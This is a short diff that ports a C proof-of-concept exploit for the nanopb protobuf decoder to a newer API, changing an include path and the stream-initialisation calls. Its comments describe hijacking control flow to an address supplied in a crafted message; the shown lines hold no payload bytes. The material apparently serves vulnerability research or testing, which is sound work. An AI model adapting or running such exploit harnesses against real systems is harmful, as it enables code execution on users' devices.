@@ -1,12 +1,12 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdint.h>
-#include <pb_decode.h>
+#include <nanopb/pb_decode.h>
 #include "submsg_ft_callback.pb.h"
 
 /* Marker the hijacked control flow lands on. Its address is printed so the
    reader can see we are NOT jumping here — we jump to the wire-supplied value. */
-static bool never_called(pb_istream_t *s, const pb_field_t *f, void **a) {
+static bool never_called(pb_decode_ctx_t *s, const pb_field_iter_t *f, void **a) {
     (void)s;(void)f;(void)a;
     printf("[poc] never_called() executed\n");
     return true;
@@ -36,7 +36,8 @@ int main(int argc, char **argv) {
     printf("\n[poc] never_called() lives at %p\n", (void*)never_called);
 
     OneOfMessage msg = OneOfMessage_init_zero;   /* app registers NO callbacks */
-    pb_istream_t is = pb_istream_from_buffer(buf, len);
+    pb_decode_ctx_t is;
+    pb_init_decode_ctx_for_buffer(&is, buf, len);
 
     printf("[poc] calling pb_decode()...\n"); fflush(stdout);
     bool ok = pb_decode(&is, OneOfMessage_fields, &msg);
